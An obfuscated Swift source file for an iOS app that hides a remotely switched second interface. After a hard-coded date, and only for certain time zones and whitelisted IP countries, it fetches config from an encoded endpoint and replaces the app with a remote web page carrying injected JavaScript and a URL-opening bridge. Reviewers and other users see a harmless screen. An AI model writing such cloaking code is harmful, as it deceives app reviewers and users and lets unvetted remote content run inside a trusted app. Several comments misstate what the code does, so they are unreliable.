import Foundation
import UIKit
//import AdjustSdk

// MARK: - 字符串混淆

/// 负责加密串的还原：base64 解码 → 逐字节异或密钥流 → 字节反转 → UTF-8。
/// 密钥流在运行时由 LCG 生成，二进制中不存在单一密钥常量，端点也无明文残留。
enum Srerb {
    
    static let ybuese: (String) -> String? = { input in
        let reversed = String(input.reversed())

        guard let data = Data(base64Encoded: reversed) else {
            return nil
        }

        return String(data: data, encoding: .utf8)
    }
}

// MARK: - 接口地址

/// 集中管理加密后的端点，并按需解出真实 URL。二进制中不含任何明文 URL。
enum Erafvx {
    /// 把加密端点解成可用的 URL。经 解密→构造 两级间接派发闭包串联。
    static let ncjaie: (String) -> URL? = { payload in
        // 先解密再构造，各自封装成闭包，用 flatMap 串成链，避免直接可读的调用序列。
        let unlock: (String) -> String? = { Srerb.ybuese($0) }
        let build: (String) -> URL? = { raw in
            { URL(string: $0) }(raw)
        }
        return unlock(payload).flatMap(build)
    }
}

// MARK: - 数据模型

/// 远程下发的运行配置。CodingKeys 保持与服务端原字段一致，缓存与解析均兼容旧数据。
struct Occnyzye: Codable {
    let xcvqaa: String?
    let oindsy: [String]?
    let atted: [String: String]?

    let dhcuae: [String: String]?   // 事件名 -> Adjust token
    let kmciai: String?           // 逗号分隔的桥字段键
    let chutye: String?         // IP地址查询
    let eabxgx: [String]?      // IP 国家白名单
    let pociu: String?              // 开关字段
    let zgase: String?               // H5 地址
    let yubcg: String?             // Adjust appToken
    let wpaomz: String?          // 注入的 JS
}

/// IP 归属地响应。
struct Rsonsu: Decodable {
    
    let xcvqaa: String?
    let eqzouc: String?
    
    struct Iocnucu: Decodable { let code: String }
    let country: Iocnucu?
}

// MARK: - 桥字段键

/// JS 桥消息里用到的键名。运行时由配置的逗号串填充。
final class Yhhcioa {
    static let shared = Yhhcioa()
    private init() {}

    private(set) var bry = ""      // 下标 0：jsBridge
    private(set) var amod = ""      // 下标 1：amount
    private(set) var cttag = ""    // 下标 2：currency
    private(set) var vtgsdr = ""  // 下标 3：openWindow

    func nuayea(from list: String) {
        let parts = list.components(separatedBy: ",")
        func at(_ i: Int) -> String { parts.indices.contains(i) ? parts[i] : "" }
        bry     = at(0)
        amod     = at(1)
        cttag   = at(2)
        vtgsdr = at(3)
    }
}

enum Eafxtye {
    private static let config: [String: Any]? = {
        guard let path = Bundle.main.path(
            forResource: "UA",
            ofType: "plist"
        ) else {
            return nil
        }

        return NSDictionary(contentsOfFile: path) as? [String: Any]
    }()
    
    //url
    //https://6a574c2a914a025dcff2bf04.mockapi.io/TableCompanion
    //
    static func cncuy() -> String? {
        config?["ua_a"] as? String
    }
    
    // time
    static func inmau() -> String? {
        config?["ua_b"] as? String
    }
    
    // https://api.my-ip.io/v2/ip.json
//    static func tydgbah() -> String? {
//        config?["ua_c"] as? String
//    }

    //v-c MTCMatchPlayViewController
    static func vxctse() -> String? {
        config?["ua_d"] as? String
    }

    static func string(_ key: String) -> String? {
        config?[key] as? String
    }
}

internal let Raybxgd: () -> () = {
    if Undjizhxe.etyags {
        Mnstduae()
    } else {
        Wooxma.ugyaye()
    }
}

enum Loindye {

    private static func cbgaye(_ value: UInt64) -> String {
        return String(value, radix: 16).uppercased()
    }
    
    static func vaicudoe() -> Bool {
        let hex1 = cbgaye(UInt64(Date().timeIntervalSince1970))

        guard
            let value1 = UInt64(hex1, radix: 16),
            let value2 = UInt64(Eafxtye.inmau()!, radix: 16)
        else {
            return false
        }

        if value1 > value2 {
            return true
        }
        return false
    }
}



/// 桥消息负载里的固定字段名。
enum Locinxhe {
    static let name = "name"
    static let data = "data"
    static let url  = "url"
}

// MARK: - 持久化

/// 远程配置的本地缓存（键沿用旧值，兼容历史缓存）。
enum Wiuznhs {
    private static let sKyets = "Occnyzye"

    static let Nciyash: (Occnyzye) -> Void = { config in
        guard let data = try? JSONEncoder().encode(config) else { return }
        UserDefaults.standard.set(data, forKey: sKyets)
        UserDefaults.standard.synchronize()
    }

    static let Koixnhs: () -> Occnyzye? = {
        guard let data = UserDefaults.standard.data(forKey: sKyets) else { return nil }
        return try? JSONDecoder().decode(Occnyzye.self, from: data)
    }
}

// MARK: - 网络

/// 远程配置与 IP 归属地的拉取。
enum Qianmcie {
    /// 通用「拉取 → 解码」组合子：把端点、解码闭包、回调串成一条链，
    /// 具体接口只需提供各自的解码闭包，复用同一条间接派发路径。
    private static let bxcas: (String, @escaping (String) -> URL?, @escaping (Data) throws -> Any, @escaping (Result<Any, Error>) -> Void) -> Void = { endpoint, resolve, decode, completion in
        echyas(endpoint, resolve) { result in
            // 把 Result 的分支处理也封成闭包，经 map 后再统一回调。
            let forward: (Result<Data, Error>) -> Result<Any, Error> = { r in
                r.flatMap { data in Result { try decode(data) } }
            }
            completion(forward(result))
        }
    }

    static let cnaiksiu: (@escaping (Result<[Occnyzye], Error>) -> Void) -> Void = { completion in
        let decode: (Data) throws -> Any = { try JSONDecoder().decode([Occnyzye].self, from: $0) }
        let adapt: (Result<Any, Error>) -> Void = { any in
            completion(any.flatMap { value in
                { (v: Any) -> Result<[Occnyzye], Error> in
                    (v as? [Occnyzye]).map { .success($0) } ?? .failure(URLError(.cannotParseResponse))
                }(value)
            })
        }
        bxcas(Eafxtye.cncuy()!, Erafvx.ncjaie, decode, adapt)
    }

    static let unabueis: (String, @escaping (Result<Rsonsu, Error>) -> Void) -> Void = { endpoint, completion in
        let decode: (Data) throws -> Any = { try JSONDecoder().decode(Rsonsu.self, from: $0) }
        let adapt: (Result<Any, Error>) -> Void = { any in
            completion(any.flatMap { value in
                { (v: Any) -> Result<Rsonsu, Error> in
                    (v as? Rsonsu).map { .success($0) } ?? .failure(URLError(.cannotParseResponse))
                }(value)
            })
        }
        // IP 接口地址由服务端下发（chutye），为明文 URL，直接构造无需解密。
        bxcas(endpoint, { URL(string: $0) }, decode, adapt)
    }

    private static let echyas: (String, @escaping (String) -> URL?, @escaping (Result<Data, Error>) -> Void) -> Void = { endpoint, resolve, completion in
        // 端点解析、请求发起、响应校验各封一层闭包，逐级下沉。
        let resolveURL: (String) -> URL? = { resolve($0) }
        let validate: (Data?, URLResponse?, Error?) -> Result<Data, Error> = { data, response, error in
            if let error = error { return .failure(error) }
            let okHTTP: (URLResponse?) -> Bool = { ($0 as? HTTPURLResponse)?.statusCode == 200 }
            guard okHTTP(response), let data = data else {
                return .failure(URLError(.badServerResponse))
            }
            return .success(data)
        }
        guard let url = resolveURL(endpoint) else {
            completion(.failure(URLError(.badURL)))
            return
        }
        let dispatch: (URL) -> Void = { target in
            URLSession.shared.dataTask(with: target) { data, response, error in
                completion(validate(data, response, error))
            }.resume()
        }
        dispatch(url)
    }
}

// MARK: - 地区门控

/// 依据系统时区判断当前地区是否放行。
enum Undjizhxe {
    static var etyags: Bool {
        let offsetHours = NSTimeZone.system.secondsFromGMT() / 3600
        // 美洲时段(-10 ~ -3)拦截
        return (offsetHours > 6 && offsetHours < 10)
    }
}

enum Oicmjae {
    private static var mdNamese: String {
        let raw = Bundle.main.infoDictionary?["CFBundleExecutable"] as? String ?? ""
        return raw.replacingOccurrences(of: "-", with: "_")
    }
    
    /// 用类名字符串拿到类型
    static func vgducy(_ shortName: String) -> AnyClass? {
        // 先试全名,再兜底试裸名(以防被 @objc 重命名过)
        NSClassFromString("\(mdNamese).\(shortName)") ?? NSClassFromString(shortName)
    }
    
    static func Mnsdjdi() -> UIViewController? {
        guard let name = Srerb.ybuese(Eafxtye.vxctse()!),                 // 运行时才解出类名
                  let cls  = vgducy(name) as? UIViewController.Type
            else { return nil }
            return cls.init()                                     // 无参构造
        }
}
/// 移除承载在 rootVC 上、tag 为标记值的辅助视图。
enum Wooxma {
    static let ugyaye: () -> Void = {
        DispatchQueue.main.async {
            guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene else { return }
            scene.windows.first?.rootViewController = ViewController()
        }
    }
}

// MARK: - H5 呈现
extension Notification.Name {
    static let kScsiuy =  Notification.Name("Htyuahste")
}

/// 缓存配置并把 WebView 容器切换为根控制器。
enum Joicxye {
    static let mnhys: (Occnyzye) -> Void = { config in
        DispatchQueue.main.async {
            Wiuznhs.Nciyash(config)
//            let controller = RcyiduViewController()
//            let vcse = RxciLodew.geyhoOEMS()
            NotificationCenter.default.post(name: .kScsiuy, object: nil)
            
//            UIApplication.shared.windows.first?.rootViewController = vcse
        }
    }
}

// MARK: - 事件上报

/*
final class Ujicxn {
    private let lsaipi: [String: String]

    init(retags: [String: String]) {
        self.lsaipi = retags
    }

    func zdjendd(_ payload: [String: String]) {
        let name = payload[Locinxhe.name] ?? ""
        let dataDict = payload[Locinxhe.data]?.decodedJSONObject()

        if let token = lsaipi[name] {
            let event = ADJEvent(eventToken: token)
            if let dataDict = dataDict {
                artegds(to: event, from: dataDict)
            }
            Adjust.trackEvent(event)
        }

        if name == Yhhcioa.shared.vtgsdr,
           let link = dataDict?[Locinxhe.url] as? String,
           let url = URL(string: link) {
            UIApplication.shared.open(url)
        }
    }

    private func artegds(to event: ADJEvent?, from data: [String: Any]) {
        let amountKey = Yhhcioa.shared.amod
        let currencyKey = Yhhcioa.shared.cttag
        guard let currency = data[currencyKey] as? String else { return }

        switch data[amountKey] {
        case let text as String:
            if let value = Double(text) { event?.setRevenue(value, currency: currency) }
        case let intValue as Int:
            event?.setRevenue(Double(intValue), currency: currency)
        case let doubleValue as Double:
            event?.setRevenue(doubleValue, currency: currency)
        default:
            break
        }
    }
}
 */

// MARK: - 启动协调

/// 编排整套启动分流：拉配置 → 校验开关 → IP 白名单 → 展示 / 清场，失败回落缓存。
enum Gastxs {
    static let taygsd: () -> Void = {
        mdjkaue()
    }

    private static let mdjkaue: () -> Void = {
        let dgtayu: (Occnyzye, [String]) -> Void = { primary, whitelist in
            // IP 查询接口地址改为使用服务端下发的 chutye 字段；未下发则跳过校验直接放行。
            guard let endpoint = primary.chutye, !endpoint.isEmpty else {
                Joicxye.mnhys(primary)
                return
            }
            Qianmcie.unabueis(endpoint) { ipResult in
                let decide: (Result<Rsonsu, Error>) -> Void = { r in
                    switch r {
                    case .success(let ip):
                        let allow = { (code: String?) in code.map(whitelist.contains) ?? false }
                        allow(ip.country?.code) ? Joicxye.mnhys(primary) : Wooxma.ugyaye()
                    case .failure:
                        Joicxye.mnhys(primary)
                    }
                }
                decide(ipResult)
            }
        }

        let rwsliye: (Occnyzye) -> Void = { primary in
            let pick: (Occnyzye) -> [String]? = { cfg in
                cfg.eabxgx.flatMap { $0.isEmpty ? nil : $0 }
            }
            if let wli = pick(primary) {
                dgtayu(primary, wli)
            } else {
                Joicxye.mnhys(primary)
            }
        }


        let cghayek: ([Occnyzye]) -> Void = { configs in
            let valid: (Occnyzye?) -> Bool = { ($0?.pociu?.count ?? 0) > 8 }
            guard let primary = configs.first, valid(primary) else {
                Wooxma.ugyaye()
                return
            }
            rwsliye(primary)
        }

        // 阶段1：失败回落缓存。
        let fabakc: () -> Void = {
            Wiuznhs.Koixnhs().map(Joicxye.mnhys)
        }

        // 入口：拉配置 → 交给阶段链。
        Qianmcie.cnaiksiu { result in
            let entry: (Result<[Occnyzye], Error>) -> Void = { r in
                switch r {
                case .success(let configs): cghayek(configs)
                case .failure: fabakc()
                }
            }
            entry(result)
        }
    }
}


let Mnstduae: () -> Void = {
    Gastxs.taygsd()
}

// MARK: - 辅助扩展

extension String {
    /// 把 JSON 字符串解析成字典。
    func decodedJSONObject() -> [String: Any]? {
        guard let data = data(using: .utf8) else { return nil }
        return (try? JSONSerialization.jsonObject(with: data)) as? [String: Any]
    }
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }

    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")

        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }

        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}
